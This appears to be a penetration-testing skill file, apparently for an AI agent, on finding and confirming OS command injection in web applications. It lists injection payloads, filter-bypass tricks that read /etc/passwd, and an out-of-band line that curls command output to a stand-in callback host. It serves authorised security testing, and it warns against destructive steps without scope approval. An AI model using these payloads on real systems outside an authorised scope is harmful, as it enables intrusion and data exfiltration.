---
name: command-injection
description: Test applications for OS command injection and server-side code injection — where user input reaches a shell, exec call, or code evaluator. Covers in-band, blind, and OOB confirmation, argument injection, and shell-metacharacter bypass. OWASP A05:2025 Injection. Use wherever the app runs system utilities, converters, pings, or evaluates expressions from input.
---

# Command Injection

Command injection runs attacker-chosen OS commands (or code) on the server — typically the fastest path to RCE and full host compromise. Part of OWASP A05:2025 (Injection). Suspect it anywhere the app shells out: ping/traceroute/nslookup tools, file/image/PDF converters (ImageMagick, ffmpeg, LibreOffice), archive handlers, backup/export features, git/SVN operations, or any "run this utility" feature.

## Find the injection points

- Obvious: network diagnostic tools, "convert/compress this file", filename-based processing, admin/system utilities.
- Subtle: parameters passed to a library that itself shells out (e.g., image metadata → ImageMagick), filenames used in a command, env vars, and archive entry names.
- Code injection variants: `eval`/`exec`/deserialization sinks, template engines (see [[ssti-testing]]), expression-language fields.

## Detection

1. **Separator payloads** — append a command using shell metacharacters:
   - `; id`, `| id`, `|| id`, `&& id`, `& id`
   - Command substitution: `` `id` ``, `$(id)`
   - Newline: `%0a id`
2. **Look for command output** in the response (in-band). `id`/`whoami`/`hostname` output confirms execution cleanly and non-destructively.
3. **Blind confirmation** when nothing is reflected:
   - **Time-based**: `; sleep 10`, `&& ping -c 10 127.0.0.1`, Windows `& timeout 10`. Confirm the delay scales and repeats.
   - **OOB**: `; nslookup <id>.oob.example`, `; curl http://oob.example/$(whoami)`, or ping the callback host. A landed DNS/HTTP hit on your interactsh/Collaborator listener is the proof, and can exfiltrate output via subdomain/path.
4. **Argument injection**: even without a separator you may inject extra flags into a fixed command (e.g., `--output`, `-o`, curl `-K`, tar `--checkpoint-action`) that change behavior or write files. Test leading `-`/`--` values.

## Platform notes

- **Linux/bash**: `;`, `|`, `&&`, `$()`, `` `` ``, `${IFS}` for space-filtering bypass, `{cat,/etc/passwd}` brace tricks.
- **Windows/cmd**: `&`, `|`, `&&`; PowerShell `;`. Different builtins (`whoami`, `dir`, `type`).
- Quote context matters — if input lands inside `"..."` or `'...'`, break out first.

## Filter / metacharacter bypass

- Space filtered: `${IFS}`, `<`, `%09` (tab), brace expansion.
- Keyword filtered: string concatenation/quoting `w'h'oami`, `who$@ami`, variable expansion, wildcards (`/???/c?t`), base64 → `bash` decode.
- Encoding: URL/double-URL, and re-encoding through the app's own transforms.

## Escalation

- Confirmed exec → establish impact carefully: read a benign file, enumerate privileges, identify whether it's a container/VM. **Do not** deploy persistence, pivot, or run destructive commands without explicit scope approval — a single `id` + OOB proof is enough to report Critical.

## Validation — avoid false positives

- Time-based: repeat with 0/5/10s sleeps and confirm response time tracks the value, not jitter.
- OOB: require an actual received callback, ideally carrying command output (e.g., `whoami` in the subdomain).
- Rule out that a delay is caused by the app's normal slow operation, not your payload.

## Severity guidance

- **Critical**: any confirmed arbitrary command/code execution.
- **High**: constrained injection (limited chars) still yielding useful execution or file read/write.
- **Medium**: argument injection with meaningful but bounded impact.

## References

- OWASP Top 10 2025 — A05 Injection
- OWASP WSTG v4.2 — 4.7.11 Testing for Command Injection
